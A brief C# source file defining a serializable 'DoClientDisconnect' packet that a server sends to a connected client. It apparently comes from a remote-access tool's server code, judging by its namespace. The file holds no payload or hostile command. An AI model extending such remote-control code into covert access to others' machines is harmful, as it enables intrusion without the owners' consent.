using System;
using xServer.KuuhakuCekirdek.Ağ;

namespace xServer.KuuhakuCekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoClientDisconnect : IPacket
    {
        public DoClientDisconnect()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}